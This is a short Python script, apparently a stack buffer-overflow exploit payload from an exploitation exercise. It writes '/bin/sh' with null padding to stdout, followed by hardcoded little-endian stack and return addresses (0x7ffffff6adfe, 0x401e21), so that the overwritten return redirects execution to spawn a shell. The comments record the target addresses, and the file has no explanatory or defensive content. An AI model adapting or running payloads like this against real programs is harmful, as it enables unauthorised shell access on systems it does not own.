#!/usr/bin/env python3

import sys

bin = b'/bin/sh\x00'
sys.stdout.buffer.write(bin)
sys.stdout.buffer.write(b'\x00'*(10-len(bin)))
sys.stdout.buffer.write(b'\x00'*8)
sys.stdout.buffer.write(b'\x00'*8)
sys.stdout.buffer.write(0x7ffffff6adfe.to_bytes(8, "little"))
sys.stdout.buffer.write(0x401e21.to_bytes(8, "little"))
sys.stdout.buffer.write(0x401e21.to_bytes(8, "little"))







# bin addr: 0x00007ffffff6adfe
#return addr: 0x7ffffff6ae18